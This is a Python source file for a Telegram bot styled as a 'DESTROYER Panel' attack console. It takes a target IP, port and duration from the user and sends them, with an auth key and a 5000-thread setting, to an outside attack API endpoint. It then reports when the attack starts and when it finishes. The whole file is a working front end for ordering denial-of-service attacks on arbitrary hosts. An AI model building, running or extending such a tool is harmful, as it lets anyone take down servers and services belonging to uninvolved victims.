#!/usr/bin/env python3
import asyncio
import json
import math
from typing import Tuple

import aiohttp  # pip install aiohttp
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)

# ===== CONFIG =====
BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"

# Your API base
API_BASE = "https://geekerguys.com/fuck.php"

# PLACEHOLDER: put your authorized key here
API_KEY = "PUT_YOUR_AUTH_KEY_HERE"  # must match key in users.json / API auth

# Conversation states
ASK_PARAMS = 1


# ===== HELPER: parse "ip port time" =====
def parse_ip_port_time(text: str) -> Tuple[str, int, int]:
    parts = text.strip().split()
    if len(parts) != 3:
        raise ValueError("Need exactly 3 values: ip port time")

    ip = parts[0]
    port = int(parts[1])
    duration = int(parts[2])

    if port <= 0 or port > 65535:
        raise ValueError("Port out of range")
    if duration <= 0 or duration > 3600:
        raise ValueError("Time out of range")

    return ip, port, duration


# ===== /start handler =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if update.message is None:
        return ConversationHandler.END

    chat_id = update.message.chat_id

    base_text = (
        "🔥 <b>Welcome to DESTROYER Panel</b>
"
        "Preparing your attack console…

"
    )

    # Initial loading message
    sent = await context.bot.send_message(
        chat_id=chat_id,
        text=base_text + "Loading: [----------] 0%",
        parse_mode="HTML",
    )

    # Animated progress bar 0–100%
    steps = 10
    for i in range(1, steps + 1):
        await asyncio.sleep(0.25)
        percent = i * 10
        bar_len = 10
        filled = math.floor((percent / 100) * bar_len)
        bar = "[" + "█" * filled + "-" * (bar_len - filled) + f"] {percent}%"
        new_text = base_text + f"Loading: {bar}"
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=sent.message_id,
                text=new_text,
                parse_mode="HTML",
            )
        except Exception:
            pass

    # Edit message into prompt
    prompt = (
        "✅ <b>Panel ready!</b>

"
        "Send your target in this format:
"
        "<code>IP PORT TIME</code>

"
        "Example:
"
        "<code>1.1.1.1 80 60</code>"
    )

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=sent.message_id,
            text=prompt,
            parse_mode="HTML",
        )
    except Exception:
        await update.message.reply_html(prompt)

    return ASK_PARAMS


# ===== Handle user ip/port/time =====
async def handle_params(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if update.message is None:
        return ConversationHandler.END

    user_text = update.message.text or ""
    chat_id = update.message.chat_id

    # Parse ip port time
    try:
        ip, port, duration = parse_ip_port_time(user_text)
    except Exception as e:
        await update.message.reply_html(
            f"❌ Invalid format.
Send like:
<code>1.1.1.1 80 60</code>

Error: <code>{e}</code>"
        )
        return ASK_PARAMS

    if not API_KEY or API_KEY.startswith("PUT_"):
        await update.message.reply_text(
            "❌ API key not configured in bot. Please set API_KEY in bot code."
        )
        return ConversationHandler.END

    # Build API URL with params
    params = {
        "key": API_KEY,
        "ip": ip,
        "port": str(port),
        "time": str(duration),
        "threads": "5000",
    }

    attack_msg = (
        f"🚀 <b>Attack starting</b>
"
        f"Target: <code>{ip}:{port}</code>
"
        f"Time: <code>{duration}s</code>
"
        f"Threads: <code>{params['threads']}</code>"
    )
    await update.message.reply_html(attack_msg)

    # Send GET request to API
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(API_BASE, params=params, timeout=10) as resp:
                text = await resp.text()
                try:
                    data = json.loads(text)
                except Exception:
                    data = {"raw": text}

                if resp.status == 200:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=f"✅ Attack started on {ip}:{port} for {duration}s.
API response: {data}",
                    )
                else:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=f"❌ API error ({resp.status}). Response: {text}",
                    )
                    return ConversationHandler.END
        except Exception as e:
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"❌ Failed to contact API: {e}",
            )
            return ConversationHandler.END

    # Wait for attack duration then notify finish
    try:
        await asyncio.sleep(duration)
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"🛑 Attack finished on {ip}:{port} ({duration}s).",
        )
    except Exception:
        pass

    # End conversation (user can /start again)
    return ConversationHandler.END


# ===== Cancel =====
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if update.message:
        await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END


# ===== main =====
async def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_PARAMS: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_params)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv)

    print("Bot running...")
    await app.run_polling()


if __name__ == "__main__":
    asyncio.run(main())